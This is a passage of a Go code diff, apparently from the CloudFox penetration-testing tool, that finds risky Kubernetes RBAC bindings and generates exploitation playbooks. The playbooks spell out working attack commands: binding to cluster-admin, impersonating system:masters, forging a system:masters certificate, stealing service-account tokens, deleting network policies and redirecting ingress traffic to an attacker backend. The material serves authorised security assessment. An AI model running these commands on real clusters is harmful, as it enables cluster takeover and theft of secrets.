+			sections.WriteString(fmt.Sprintf("- %s (%s) via %s/%s - Scope: %s\n", path.Principal, path.PrincipalType, path.RoleName, path.BindingName, path.ScopeName))
+		}
+		sections.WriteString("\n### Exploitation:\n")
+		sections.WriteString("```bash\n")
+		sections.WriteString("# List services\n")
+		sections.WriteString("kubectl get services -A -o wide\n\n")
+		sections.WriteString("# Get endpoint IPs for direct pod access\n")
+		sections.WriteString("kubectl get endpoints -A\n\n")
+		sections.WriteString("# Port forward to discovered services\n")
+		sections.WriteString("kubectl port-forward svc/<service-name> 8080:80\n")
+		sections.WriteString("```\n\n")
+	}
+
+	// Node Access
+	if len(categories["Node Access"]) > 0 {
+		sections.WriteString("## Node Access\n\n")
+		sections.WriteString("Principals with node proxy access can access the kubelet API on nodes.\n\n")
+		sections.WriteString("### Principals with this capability:\n")
+		for _, path := range categories["Node Access"] {
+			sections.WriteString(fmt.Sprintf("- %s (%s) via %s/%s - %s\n", path.Principal, path.PrincipalType, path.RoleName, path.BindingName, path.Description))
+		}
+		sections.WriteString("\n### Exploitation:\n")
+		sections.WriteString("```bash\n")
+		sections.WriteString("# List all nodes\n")
+		sections.WriteString("kubectl get nodes -o wide\n\n")
+		sections.WriteString("# Access kubelet API via proxy\n")
+		sections.WriteString("kubectl get --raw \"/api/v1/nodes/<node-name>/proxy/pods\"\n\n")
+		sections.WriteString("# Execute commands on any pod via kubelet (nodes/proxy RCE)\n")
+		sections.WriteString("# See privesc playbook for detailed exploitation\n")
+		sections.WriteString("```\n\n")
+	}
+
+	// Network Policy Bypass
+	if len(categories["Network"]) > 0 {
+		sections.WriteString("## Network Policy Bypass\n\n")
+		sections.WriteString("Principals with network policy modification can bypass network segmentation.\n\n")
+		sections.WriteString("### Principals with this capability:\n")
+		for _, path := range categories["Network"] {
+			sections.WriteString(fmt.Sprintf("- %s (%s) via %s/%s - %s\n", path.Principal, path.PrincipalType, path.RoleName, path.BindingName, path.Description))
+		}
+		sections.WriteString("\n### Exploitation:\n")
+		sections.WriteString("```bash\n")
+		sections.WriteString("# List network policies\n")
+		sections.WriteString("kubectl get networkpolicies -A\n\n")
+		sections.WriteString("# Delete network policy to remove restrictions\n")
+		sections.WriteString("kubectl delete networkpolicy <policy-name> -n <namespace>\n\n")
+		sections.WriteString("# Or modify to allow all traffic\n")
+		sections.WriteString("kubectl patch networkpolicy <policy-name> -n <namespace> --type=json -p='[{\"op\":\"replace\",\"path\":\"/spec/ingress\",\"value\":[{}]},{\"op\":\"replace\",\"path\":\"/spec/egress\",\"value\":[{}]}]'\n")
+		sections.WriteString("```\n\n")
+	}
+
+	// CRD Policy Bypass (Istio, Cilium, Calico)
+	if len(categories["CRD Policy Bypass"]) > 0 {
+		sections.WriteString("## CRD Network Policy Bypass\n\n")
+		sections.WriteString("Principals with CRD policy modification can bypass service mesh and CNI policies.\n\n")
+		sections.WriteString("### Principals with this capability:\n")
+		for _, path := range categories["CRD Policy Bypass"] {
+			sections.WriteString(fmt.Sprintf("- %s (%s) via %s/%s - %s\n", path.Principal, path.PrincipalType, path.RoleName, path.BindingName, path.Description))
+		}
+		sections.WriteString("\n### Exploitation:\n")
+		sections.WriteString("```bash\n")
+		sections.WriteString("# List Istio authorization policies\n")
+		sections.WriteString("kubectl get authorizationpolicies -A\n\n")
+		sections.WriteString("# Delete Istio policy\n")
+		sections.WriteString("kubectl delete authorizationpolicy <policy-name> -n <namespace>\n\n")
+		sections.WriteString("# List Cilium network policies\n")
+		sections.WriteString("kubectl get ciliumnetworkpolicies -A\n\n")
+		sections.WriteString("# List Calico network policies\n")
+		sections.WriteString("kubectl get networkpolicies.projectcalico.org -A\n")
+		sections.WriteString("```\n\n")
+	}
+
+	// Ingress Manipulation
+	if len(categories["Ingress"]) > 0 {
+		sections.WriteString("## Ingress Manipulation\n\n")
+		sections.WriteString("Principals with ingress modification can redirect traffic for interception or lateral movement.\n\n")
+		sections.WriteString("### Principals with this capability:\n")
+		for _, path := range categories["Ingress"] {
+			sections.WriteString(fmt.Sprintf("- %s (%s) via %s/%s - %s\n", path.Principal, path.PrincipalType, path.RoleName, path.BindingName, path.Description))
+		}
+		sections.WriteString("\n### Exploitation:\n")
+		sections.WriteString("```bash\n")
+		sections.WriteString("# List ingresses\n")
+		sections.WriteString("kubectl get ingress -A\n\n")
+		sections.WriteString("# Modify ingress to redirect traffic to attacker-controlled backend\n")
+		sections.WriteString("kubectl patch ingress <name> -n <namespace> --type=json -p='[\n")
+		sections.WriteString("  {\"op\":\"replace\",\"path\":\"/spec/rules/0/http/paths/0/backend/service/name\",\"value\":\"attacker-service\"}\n")
+		sections.WriteString("]'\n\n")
+		sections.WriteString("# Add new path to intercept specific traffic\n")
+		sections.WriteString("kubectl patch ingress <name> -n <namespace> --type=json -p='[\n")
+		sections.WriteString("  {\"op\":\"add\",\"path\":\"/spec/rules/0/http/paths/-\",\"value\":{\n")
+		sections.WriteString("    \"path\":\"/api/sensitive\",\n")
+		sections.WriteString("    \"pathType\":\"Prefix\",\n")
+		sections.WriteString("    \"backend\":{\"service\":{\"name\":\"attacker-svc\",\"port\":{\"number\":80}}}\n")
+		sections.WriteString("  }}\n")
+		sections.WriteString("]'\n")
+		sections.WriteString("```\n\n")
+	}
+
+	// Namespace Discovery
+	if len(categories["Namespace Discovery"]) > 0 {
+		sections.WriteString("## Namespace Discovery\n\n")
+		sections.WriteString("Principals with namespace access can discover lateral movement targets.\n\n")
+		sections.WriteString("### Principals with this capability:\n")
+		for _, path := range categories["Namespace Discovery"] {
+			sections.WriteString(fmt.Sprintf("- %s (%s) via %s/%s - Scope: %s\n", path.Principal, path.PrincipalType, path.RoleName, path.BindingName, path.ScopeName))
+		}
+		sections.WriteString("\n### Exploitation:\n")
+		sections.WriteString("```bash\n")
+		sections.WriteString("# List all namespaces\n")
+		sections.WriteString("kubectl get namespaces\n\n")
+		sections.WriteString("# Check for interesting labels\n")
+		sections.WriteString("kubectl get namespaces --show-labels\n")
+		sections.WriteString("```\n\n")
+	}
+
+	// Pod Discovery
+	if len(categories["Pod Discovery"]) > 0 {
+		sections.WriteString("## Pod Discovery\n\n")
+		sections.WriteString("Principals with pod list/get access can discover targets for lateral movement.\n\n")
+		sections.WriteString("### Principals with this capability:\n")
+		for _, path := range categories["Pod Discovery"] {
+			sections.WriteString(fmt.Sprintf("- %s (%s) via %s/%s - Scope: %s\n", path.Principal, path.PrincipalType, path.RoleName, path.BindingName, path.ScopeName))
+		}
+		sections.WriteString("\n### Exploitation:\n")
+		sections.WriteString("```bash\n")
+		sections.WriteString("# List all pods with details\n")
+		sections.WriteString("kubectl get pods -A -o wide\n\n")
+		sections.WriteString("# Find pods with specific labels (e.g., databases)\n")
+		sections.WriteString("kubectl get pods -A -l app=postgres -o wide\n")
+		sections.WriteString("kubectl get pods -A -l app=mysql -o wide\n")
+		sections.WriteString("kubectl get pods -A -l app=redis -o wide\n\n")
+		sections.WriteString("# Find pods with hostNetwork (potential node access)\n")
+		sections.WriteString("kubectl get pods -A -o json | jq '.items[] | select(.spec.hostNetwork==true) | {name: .metadata.name, namespace: .metadata.namespace}'\n\n")
+		sections.WriteString("# Find privileged pods (potential container escape)\n")
+		sections.WriteString("kubectl get pods -A -o json | jq '.items[] | select(.spec.containers[].securityContext.privileged==true) | {name: .metadata.name, namespace: .metadata.namespace}'\n\n")
+		sections.WriteString("# Get pod IPs for direct network access\n")
+		sections.WriteString("kubectl get pods -A -o jsonpath='{range .items[*]}{.metadata.namespace}/{.metadata.name}: {.status.podIP}{\"\\n\"}{end}'\n")
+		sections.WriteString("```\n\n")
+	}
+
+	return sections.String()
 }
 
 func generateExploitCommand(pathType, verb, resource, scope, principal string) string {
@@ -1483,4 +2685,579 @@ kubectl %s crd <crd-name> --type=json -p='[{"op":"replace","path":"/spec/version
 	// Fallback: generic command
 	// =========================================================================
 	return fmt.Sprintf("kubectl %s%s %s", namespaceFlag, verb, resource)
+}
+
+// AnalyzeHiddenAdmins finds hidden administrative access patterns in RBAC configuration.
+// This includes:
+// - Principals bound to cluster-admin or system:masters group
+// - Principals with RBAC modification capabilities
+// - Principals with impersonation rights
+// - Principals with certificate approval permissions
+// - Aggregation roles that accumulate dangerous permissions
+// - Wildcard group bindings
+// - Default service accounts with elevated permissions
+func (s *AttackPathService) AnalyzeHiddenAdmins(ctx context.Context) (*HiddenAdminData, error) {
+	cacheKey := sdk.CacheKey("k8s-attackpaths", "hiddenadmins")
+
+	// Check cache first
+	if cached, found := sdk.Get(cacheKey); found {
+		if result, ok := cached.(*HiddenAdminData); ok {
+			return result, nil
+		}
+	}
+
+	result := &HiddenAdminData{
+		ClusterAdmins:       []HiddenAdminFinding{},
+		RBACModifiers:       []HiddenAdminFinding{},
+		Impersonators:       []HiddenAdminFinding{},
+		CertApprovers:       []HiddenAdminFinding{},
+		AggregationRoles:    []HiddenAdminFinding{},
+		WildcardBindings:    []HiddenAdminFinding{},
+		DefaultSAElevations: []HiddenAdminFinding{},
+		AllFindings:         []HiddenAdminFinding{},
+	}
+
+	// Get all RBAC objects
+	crbsList, err := sdk.GetClusterRoleBindings(ctx, s.clientset)
+	if err != nil {
+		return nil, fmt.Errorf("failed to list ClusterRoleBindings: %w", err)
+	}
+
+	clusterRolesList, err := sdk.GetClusterRoles(ctx, s.clientset)
+	if err != nil {
+		return nil, fmt.Errorf("failed to list ClusterRoles: %w", err)
+	}
+
+	// Build ClusterRole map
+	crMap := make(map[string]*v1.ClusterRole)
+	for i := range clusterRolesList {
+		crMap[clusterRolesList[i].Name] = &clusterRolesList[i]
+	}
+
+	// Check for aggregation roles
+	aggregationRoleNames := make(map[string]bool)
+	for _, cr := range clusterRolesList {
+		if cr.AggregationRule != nil && len(cr.AggregationRule.ClusterRoleSelectors) > 0 {
+			aggregationRoleNames[cr.Name] = true
+		}
+	}
+
+	// Analyze ClusterRoleBindings
+	for _, crb := range crbsList {
+		cr, ok := crMap[crb.RoleRef.Name]
+		if !ok {
+			continue
+		}
+
+		for _, subject := range crb.Subjects {
+			principal := formatPrincipal(subject)
+
+			// Check 1: cluster-admin or system:masters binding
+			if crb.RoleRef.Name == "cluster-admin" || subject.Name == "system:masters" {
+				finding := HiddenAdminFinding{
+					Principal:      principal,
+					PrincipalType:  subject.Kind,
+					Namespace:      subject.Namespace,
+					Scope:          "cluster",
+					RoleName:       crb.RoleRef.Name,
+					BindingName:    crb.Name,
+					RiskLevel:      shared.RiskCritical,
+					Permissions:    []string{"*/*:*"},
+					Description:    fmt.Sprintf("%s has cluster-admin access via %s", principal, crb.Name),
+					IsWildcard:     subject.Kind == "Group" && (subject.Name == "system:masters" || strings.HasPrefix(subject.Name, "*")),
+					IsDefault:      subject.Kind == "ServiceAccount" && subject.Name == "default",
+					Feasibility:    "Immediate",
+					AttackSteps:    []string{"Has full cluster-admin privileges"},
+					ExploitCommand: fmt.Sprintf("kubectl --as=%s get secrets -A", principal),
+				}
+				result.ClusterAdmins = append(result.ClusterAdmins, finding)
+				result.AllFindings = append(result.AllFindings, finding)
+				continue
+			}
+
+			// Check 2: Aggregation role binding
+			if aggregationRoleNames[crb.RoleRef.Name] {
+				finding := HiddenAdminFinding{
+					Principal:      principal,
+					PrincipalType:  subject.Kind,
+					Namespace:      subject.Namespace,
+					Scope:          "cluster",
+					RoleName:       crb.RoleRef.Name,
+					BindingName:    crb.Name,
+					RiskLevel:      shared.RiskHigh,
+					Permissions:    []string{"aggregated"},
+					Description:    fmt.Sprintf("%s bound to aggregation role %s - permissions may grow as new roles are added", principal, crb.RoleRef.Name),
+					IsAggregation:  true,
+					Feasibility:    "Requires-Enum",
+					AttackSteps:    []string{"Enumerate aggregated permissions", "Check for newly added dangerous permissions"},
+					ExploitCommand: fmt.Sprintf("kubectl get clusterrole %s -o yaml | grep -A 100 'rules:'", crb.RoleRef.Name),
+				}
+				result.AggregationRoles = append(result.AggregationRoles, finding)
+				result.AllFindings = append(result.AllFindings, finding)
+			}
+
+			// Check 3: Wildcard group binding
+			if subject.Kind == "Group" && strings.Contains(subject.Name, "*") {
+				finding := HiddenAdminFinding{
+					Principal:      principal,
+					PrincipalType:  subject.Kind,
+					Namespace:      subject.Namespace,
+					Scope:          "cluster",
+					RoleName:       crb.RoleRef.Name,
+					BindingName:    crb.Name,
+					RiskLevel:      shared.RiskHigh,
+					Permissions:    extractPermissionsFromRules(cr.Rules),
+					Description:    fmt.Sprintf("Wildcard group %s may match unintended users", subject.Name),
+					IsWildcard:     true,
+					Feasibility:    "Requires-Enum",
+					AttackSteps:    []string{"Create user that matches wildcard pattern", "Authenticate to gain these permissions"},
+					ExploitCommand: fmt.Sprintf("# Group pattern: %s\n# Create a user/SA that matches this pattern", subject.Name),
+				}
+				result.WildcardBindings = append(result.WildcardBindings, finding)
+				result.AllFindings = append(result.AllFindings, finding)
+			}
+
+			// Check 4: Default SA with elevated permissions
+			if subject.Kind == "ServiceAccount" && subject.Name == "default" {
+				hasDangerousPerms := false
+				for _, rule := range cr.Rules {
+					for _, verb := range rule.Verbs {
+						for _, resource := range rule.Resources {
+							apiGroups := rule.APIGroups
+							if len(apiGroups) == 0 {
+								apiGroups = []string{""}
+							}
+							for _, apiGroup := range apiGroups {
+								if len(FindMatchingHiddenAdminPermissions(verb, resource, apiGroup)) > 0 ||
+									len(FindMatchingPrivescPermissions(verb, resource, apiGroup)) > 0 {
+									hasDangerousPerms = true
+									break
+								}
+							}
+							if hasDangerousPerms {
+								break
+							}
+						}
+						if hasDangerousPerms {
+							break
+						}
+					}
+					if hasDangerousPerms {
+						break
+					}
+				}
+				if hasDangerousPerms {
+					finding := HiddenAdminFinding{
+						Principal:      principal,
+						PrincipalType:  subject.Kind,
+						Namespace:      subject.Namespace,
+						Scope:          "cluster",
+						RoleName:       crb.RoleRef.Name,
+						BindingName:    crb.Name,
+						RiskLevel:      shared.RiskHigh,
+						Permissions:    extractPermissionsFromRules(cr.Rules),
+						Description:    fmt.Sprintf("Default SA in %s has elevated permissions - any pod without explicit SA inherits these", subject.Namespace),
+						IsDefault:      true,
+						Feasibility:    "Immediate",
+						AttackSteps:    []string{"Deploy pod in namespace without specifying serviceAccountName", "Pod automatically gets default SA permissions"},
+						ExploitCommand: fmt.Sprintf("kubectl -n %s run pwn --image=alpine -- sleep 3600 && kubectl -n %s exec pwn -- cat /var/run/secrets/kubernetes.io/serviceaccount/token", subject.Namespace, subject.Namespace),
+					}
+					result.DefaultSAElevations = append(result.DefaultSAElevations, finding)
+					result.AllFindings = append(result.AllFindings, finding)
+				}
+			}
+
+			// Check 5: RBAC modification, impersonation, and certificate permissions
+			for _, rule := range cr.Rules {
+				for _, verb := range rule.Verbs {
+					for _, resource := range rule.Resources {
+						apiGroups := rule.APIGroups
+						if len(apiGroups) == 0 {
+							apiGroups = []string{""}
+						}
+
+						for _, apiGroup := range apiGroups {
+							matches := FindMatchingHiddenAdminPermissions(verb, resource, apiGroup)
+							for _, match := range matches {
+								finding := HiddenAdminFinding{
+									Principal:      principal,
+									PrincipalType:  subject.Kind,
+									Namespace:      subject.Namespace,
+									Scope:          "cluster",
+									RoleName:       crb.RoleRef.Name,
+									BindingName:    crb.Name,
+									RiskLevel:      match.RiskLevel,
+									Permissions:    []string{fmt.Sprintf("%s %s", verb, resource)},
+									Description:    match.Description,
+									Feasibility:    determineFeasibility(match.Category),
+									AttackSteps:    getAttackSteps(match.Category),
+									ExploitCommand: generateHiddenAdminExploitCommand(match.Category, verb, resource, principal),
+								}
+
+								switch match.Category {
+								case "RBAC Modification", "RBAC Escalation", "Full RBAC Control":
+									result.RBACModifiers = append(result.RBACModifiers, finding)
+								case "Impersonation":
+									result.Impersonators = append(result.Impersonators, finding)
+								case "Certificate Approval":
+									result.CertApprovers = append(result.CertApprovers, finding)
+								}
+								result.AllFindings = append(result.AllFindings, finding)
+							}
+						}
+					}
+				}
+			}
+		}
+	}
+
+	// Also check namespace-level RoleBindings for hidden admin patterns
+	allRbs, err := sdk.GetRoleBindings(ctx, s.clientset)
+	if err == nil {
+		allRoles, _ := sdk.GetRoles(ctx, s.clientset)
+		roleMap := make(map[string]*v1.Role)
+		for i := range allRoles {
+			roleMap[fmt.Sprintf("%s/%s", allRoles[i].Namespace, allRoles[i].Name)] = &allRoles[i]
+		}
+
+		for _, rb := range allRbs {
+			var rules []v1.PolicyRule
+
+			if rb.RoleRef.Kind == "Role" {
+				if role, ok := roleMap[fmt.Sprintf("%s/%s", rb.Namespace, rb.RoleRef.Name)]; ok {
+					rules = role.Rules
+				}
+			} else if rb.RoleRef.Kind == "ClusterRole" {
+				if cr, ok := crMap[rb.RoleRef.Name]; ok {
+					rules = cr.Rules
+				}
+			}
+
+			if len(rules) == 0 {
+				continue
+			}
+
+			for _, subject := range rb.Subjects {
+				principal := formatPrincipal(subject)
+
+				// Check for default SA with namespace-level RBAC modification
+				if subject.Kind == "ServiceAccount" && subject.Name == "default" {
+					for _, rule := range rules {
+						for _, verb := range rule.Verbs {
+							for _, resource := range rule.Resources {
+								apiGroups := rule.APIGroups
+								if len(apiGroups) == 0 {
+									apiGroups = []string{""}
+								}
+
+								for _, apiGroup := range apiGroups {
+									matches := FindMatchingHiddenAdminPermissions(verb, resource, apiGroup)
+									if len(matches) > 0 {
+										finding := HiddenAdminFinding{
+											Principal:      principal,
+											PrincipalType:  subject.Kind,
+											Namespace:      rb.Namespace,
+											Scope:          "namespace",
+											RoleName:       rb.RoleRef.Name,
+											BindingName:    rb.Name,
+											RiskLevel:      shared.RiskHigh,
+											Permissions:    extractPermissionsFromRules(rules),
+											Description:    fmt.Sprintf("Default SA in %s has RBAC/IAM permissions - any pod without explicit SA inherits these", rb.Namespace),
+											IsDefault:      true,
+											Feasibility:    "Immediate",
+											AttackSteps:    []string{"Deploy pod without specifying serviceAccountName", "Escalate to admin via RBAC permissions"},
+											ExploitCommand: fmt.Sprintf("kubectl -n %s run pwn --image=alpine -- sleep 3600", rb.Namespace),
+										}
+										result.DefaultSAElevations = append(result.DefaultSAElevations, finding)
+										result.AllFindings = append(result.AllFindings, finding)
+										break
+									}
+								}
+							}
+						}
+					}
+				}
+			}
+		}
+	}
+
+	// Cache the result
+	sdk.Set(cacheKey, result)
+
+	return result, nil
+}
+
+// Helper functions for AnalyzeHiddenAdmins
+
+func extractPermissionsFromRules(rules []v1.PolicyRule) []string {
+	var perms []string
+	for _, rule := range rules {
+		for _, verb := range rule.Verbs {
+			for _, resource := range rule.Resources {
+				perms = append(perms, fmt.Sprintf("%s %s", verb, resource))
+			}
+		}
+	}
+	return perms
+}
+
+func determineFeasibility(category string) string {
+	switch category {
+	case "Full RBAC Control", "RBAC Modification":
+		return "Immediate"
+	case "Impersonation":
+		return "Immediate"
+	case "RBAC Escalation":
+		return "Immediate"
+	case "Certificate Approval":
+		return "Requires-Enum"
+	default:
+		return "Complex"
+	}
+}
+
+func getAttackSteps(category string) []string {
+	switch category {
+	case "RBAC Modification", "Full RBAC Control":
+		return []string{
+			"Create ClusterRoleBinding to cluster-admin",
+			"Or modify existing role to add wildcard permissions",
+		}
+	case "RBAC Escalation":
+		return []string{
+			"Use bind/escalate verb to bypass permission checks",
+			"Bind self to cluster-admin without having its permissions",
+		}
+	case "Impersonation":
+		return []string{
+			"Impersonate system:masters group",
+			"Or impersonate cluster-admin user",
+		}
+	case "Certificate Approval":
+		return []string{
+			"Create CSR for system:masters group",
+			"Approve the CSR",
+			"Use generated certificate to authenticate",
+		}
+	default:
+		return []string{"Enumerate permissions and exploit"}
+	}
+}
+
+func generateHiddenAdminExploitCommand(category, verb, resource, principal string) string {
+	switch category {
+	case "RBAC Modification", "Full RBAC Control":
+		if strings.Contains(resource, "clusterrolebinding") {
+			return fmt.Sprintf("kubectl create clusterrolebinding pwn --clusterrole=cluster-admin --user=%s", principal)
+		}
+		if strings.Contains(resource, "rolebinding") {
+			return "kubectl create rolebinding pwn -n <namespace> --clusterrole=admin --user=<your-user>"
+		}
+		if strings.Contains(resource, "clusterrole") {
+			return `kubectl patch clusterrole <role-name> --type=json -p='[{"op":"add","path":"/rules/-","value":{"apiGroups":["*"],"resources":["*"],"verbs":["*"]}}]'`
+		}
+		return "kubectl create clusterrolebinding pwn --clusterrole=cluster-admin --user=<your-user>"
+	case "RBAC Escalation":
+		return "kubectl create clusterrolebinding pwn --clusterrole=cluster-admin --user=<your-user>  # Uses bind/escalate to bypass checks"
+	case "Impersonation":
+		if strings.Contains(resource, "group") {
+			return "kubectl --as=dummy --as-group=system:masters get secrets -A"
+		}
+		if strings.Contains(resource, "serviceaccount") {
+			return "kubectl --as=system:serviceaccount:kube-system:admin-sa get secrets -A"
+		}
+		return "kubectl --as=system:admin get secrets -A"
+	case "Certificate Approval":
+		return `# 1. Create CSR for system:masters
+openssl req -new -key key.pem -out csr.pem -subj "/CN=admin/O=system:masters"
+# 2. Submit and approve CSR
+kubectl certificate approve <csr-name>
+# 3. Use certificate to authenticate`
+	default:
+		return fmt.Sprintf("kubectl %s %s", verb, resource)
+	}
+}
+
+// GenerateHiddenAdminsPlaybook generates a comprehensive playbook for exploiting hidden admin access
+func GenerateHiddenAdminsPlaybook(data *HiddenAdminData, identityHeader string) string {
+	if data == nil || len(data.AllFindings) == 0 {
+		return ""
+	}
+
+	var sections strings.Builder
+	if identityHeader != "" {
+		sections.WriteString(fmt.Sprintf(`# Kubernetes Hidden Admin Exploitation Playbook for %s
+# Generated by CloudFox
+#
+# This playbook provides exploitation techniques for identified hidden administrative access patterns.
+# Hidden admins are principals with IAM/RBAC escalation capabilities that may not be obvious.
+
+`, identityHeader))
+	} else {
+		sections.WriteString(`# Kubernetes Hidden Admin Exploitation Playbook
+# Generated by CloudFox
+#
+# This playbook provides exploitation techniques for identified hidden administrative access patterns.
+# Hidden admins are principals with IAM/RBAC escalation capabilities that may not be obvious.
+
+`)
+	}
+
+	// Cluster Admins section
+	if len(data.ClusterAdmins) > 0 {
+		sections.WriteString("## Cluster Admins (Immediate Access)\n\n")
+		sections.WriteString("These principals have full cluster-admin or system:masters access.\n\n")
+		sections.WriteString("### Principals:\n")
+		for _, f := range data.ClusterAdmins {
+			sections.WriteString(fmt.Sprintf("- %s (%s) via %s/%s\n", f.Principal, f.PrincipalType, f.RoleName, f.BindingName))
+			if f.IsDefault {
+				sections.WriteString("  **WARNING**: This is the default ServiceAccount - any pod without explicit SA inherits this!\n")
+			}
+		}
+		sections.WriteString("\n### Exploitation:\n")
+		sections.WriteString("```bash\n")
+		sections.WriteString("# These identities can do anything - no escalation needed\n")
+		sections.WriteString("kubectl get secrets -A\n")
+		sections.WriteString("kubectl exec -it <pod> -- /bin/sh\n")
+		sections.WriteString("kubectl create clusterrolebinding persistence --clusterrole=cluster-admin --serviceaccount=default:default\n")
+		sections.WriteString("```\n\n")
+	}
+
+	// RBAC Modifiers section
+	if len(data.RBACModifiers) > 0 {
+		sections.WriteString("## RBAC Modifiers\n\n")
+		sections.WriteString("These principals can modify RBAC to escalate their own or others' privileges.\n\n")
+		sections.WriteString("### Principals:\n")
+		for _, f := range data.RBACModifiers {
+			sections.WriteString(fmt.Sprintf("- %s (%s) - %s\n", f.Principal, f.PrincipalType, f.Description))
+			sections.WriteString(fmt.Sprintf("  Role: %s via %s | Feasibility: %s\n", f.RoleName, f.BindingName, f.Feasibility))
+		}
+		sections.WriteString("\n### Exploitation:\n")
+		sections.WriteString("```bash\n")
+		sections.WriteString("# Create ClusterRoleBinding to cluster-admin\n")
+		sections.WriteString("kubectl create clusterrolebinding pwn --clusterrole=cluster-admin --user=<your-user>\n\n")
+		sections.WriteString("# Or modify existing ClusterRole to add wildcard\n")
+		sections.WriteString(`kubectl patch clusterrole <role-name> --type=json -p='[{"op":"add","path":"/rules/-","value":{"apiGroups":["*"],"resources":["*"],"verbs":["*"]}}]'` + "\n\n")
+		sections.WriteString("# Or create RoleBinding in specific namespace\n")
+		sections.WriteString("kubectl create rolebinding pwn -n <namespace> --clusterrole=admin --user=<your-user>\n")
+		sections.WriteString("```\n\n")
+	}
+
+	// Impersonators section
+	if len(data.Impersonators) > 0 {
+		sections.WriteString("## Impersonators\n\n")
+		sections.WriteString("These principals can impersonate other users, groups, or service accounts.\n\n")
+		sections.WriteString("### Principals:\n")
+		for _, f := range data.Impersonators {
+			sections.WriteString(fmt.Sprintf("- %s (%s) - %s\n", f.Principal, f.PrincipalType, f.Description))
+			sections.WriteString(fmt.Sprintf("  Role: %s via %s\n", f.RoleName, f.BindingName))
+		}
+		sections.WriteString("\n### Exploitation:\n")
+		sections.WriteString("```bash\n")
+		sections.WriteString("# Impersonate system:masters group (cluster-admin equivalent)\n")
+		sections.WriteString("kubectl --as=dummy --as-group=system:masters get secrets -A\n\n")
+		sections.WriteString("# Impersonate cluster-admin user\n")
+		sections.WriteString("kubectl --as=system:admin get secrets -A\n\n")
+		sections.WriteString("# Impersonate a privileged service account\n")
+		sections.WriteString("kubectl --as=system:serviceaccount:kube-system:admin-sa get secrets -A\n\n")
+		sections.WriteString("# Check what you can do as the impersonated identity\n")
+		sections.WriteString("kubectl --as=system:admin auth can-i --list\n")
+		sections.WriteString("```\n\n")
+	}
+
+	// Certificate Approvers section
+	if len(data.CertApprovers) > 0 {
+		sections.WriteString("## Certificate Approvers\n\n")
+		sections.WriteString("These principals can approve CSRs to create new cluster identities.\n\n")
+		sections.WriteString("### Principals:\n")
+		for _, f := range data.CertApprovers {
+			sections.WriteString(fmt.Sprintf("- %s (%s) - %s\n", f.Principal, f.PrincipalType, f.Description))
+			sections.WriteString(fmt.Sprintf("  Role: %s via %s\n", f.RoleName, f.BindingName))
+		}
+		sections.WriteString("\n### Exploitation:\n")
+		sections.WriteString("```bash\n")
+		sections.WriteString("# Step 1: Generate a key\n")
+		sections.WriteString("openssl genrsa -out admin.key 2048\n\n")
+		sections.WriteString("# Step 2: Create CSR with system:masters group\n")
+		sections.WriteString("openssl req -new -key admin.key -out admin.csr -subj \"/CN=pwn-admin/O=system:masters\"\n\n")
+		sections.WriteString("# Step 3: Submit CSR to Kubernetes\n")
+		sections.WriteString(`cat <<EOF | kubectl apply -f -
+apiVersion: certificates.k8s.io/v1
+kind: CertificateSigningRequest
+metadata:
+  name: pwn-admin
+spec:
+  request: $(cat admin.csr | base64 | tr -d '\n')
+  signerName: kubernetes.io/kube-apiserver-client
+  usages: [client auth]
+EOF` + "\n\n")
+		sections.WriteString("# Step 4: Approve the CSR\n")
+		sections.WriteString("kubectl certificate approve pwn-admin\n\n")
+		sections.WriteString("# Step 5: Get the certificate\n")
+		sections.WriteString("kubectl get csr pwn-admin -o jsonpath='{.status.certificate}' | base64 -d > admin.crt\n\n")
+		sections.WriteString("# Step 6: Use to authenticate\n")
+		sections.WriteString("kubectl --client-certificate=admin.crt --client-key=admin.key get secrets -A\n")
+		sections.WriteString("```\n\n")
+	}
+
+	// Aggregation Roles section
+	if len(data.AggregationRoles) > 0 {
+		sections.WriteString("## Aggregation Roles\n\n")
+		sections.WriteString("These principals are bound to aggregation roles - their permissions can grow as new roles are added.\n\n")
+		sections.WriteString("### Principals:\n")
+		for _, f := range data.AggregationRoles {
+			sections.WriteString(fmt.Sprintf("- %s (%s) via %s/%s\n", f.Principal, f.PrincipalType, f.RoleName, f.BindingName))
+		}
+		sections.WriteString("\n### Exploitation:\n")
+		sections.WriteString("```bash\n")
+		sections.WriteString("# Check current aggregated permissions\n")
+		sections.WriteString("kubectl get clusterrole <role-name> -o yaml | grep -A 100 'rules:'\n\n")
+		sections.WriteString("# If you can create ClusterRoles with matching labels, you can expand permissions!\n")
+		sections.WriteString("# Check aggregation rule:\n")
+		sections.WriteString("kubectl get clusterrole <role-name> -o jsonpath='{.aggregationRule}'\n")
+		sections.WriteString("```\n\n")
+	}
+
+	// Default SA Elevations section
+	if len(data.DefaultSAElevations) > 0 {
+		sections.WriteString("## Default ServiceAccount Elevations\n\n")
+		sections.WriteString("**CRITICAL**: These default ServiceAccounts have elevated permissions.\n")
+		sections.WriteString("Any pod deployed without an explicit serviceAccountName inherits these!\n\n")
+		sections.WriteString("### Affected Namespaces:\n")
+		seenNS := make(map[string]bool)
+		for _, f := range data.DefaultSAElevations {
+			if !seenNS[f.Namespace] {
+				sections.WriteString(fmt.Sprintf("- %s: %s\n", f.Namespace, f.Description))
+				seenNS[f.Namespace] = true
+			}
+		}
+		sections.WriteString("\n### Exploitation:\n")
+		sections.WriteString("```bash\n")
+		sections.WriteString("# Deploy a pod in the affected namespace WITHOUT specifying serviceAccountName\n")
+		sections.WriteString("kubectl -n <namespace> run pwn --image=alpine -- sleep 3600\n\n")
+		sections.WriteString("# The pod automatically gets the default SA's elevated permissions\n")
+		sections.WriteString("kubectl -n <namespace> exec pwn -- cat /var/run/secrets/kubernetes.io/serviceaccount/token\n\n")
+		sections.WriteString("# Use the token to access cluster resources\n")
+		sections.WriteString("TOKEN=$(kubectl -n <namespace> exec pwn -- cat /var/run/secrets/kubernetes.io/serviceaccount/token)\n")
+		sections.WriteString("kubectl --token=$TOKEN get secrets -A\n")
+		sections.WriteString("```\n\n")
+	}
+
+	// Wildcard Bindings section
+	if len(data.WildcardBindings) > 0 {
+		sections.WriteString("## Wildcard Group Bindings\n\n")
+		sections.WriteString("These bindings use wildcard patterns that may match unintended users.\n\n")
+		sections.WriteString("### Bindings:\n")
+		for _, f := range data.WildcardBindings {
+			sections.WriteString(fmt.Sprintf("- %s (Group) via %s/%s\n", f.Principal, f.RoleName, f.BindingName))
+		}
+		sections.WriteString("\n### Exploitation:\n")
+		sections.WriteString("```bash\n")
+		sections.WriteString("# If you can create users or authenticate as a user matching the wildcard,\n")
+		sections.WriteString("# you will inherit these permissions\n")
+		sections.WriteString("# Check OIDC/external auth configuration for user creation vectors\n")
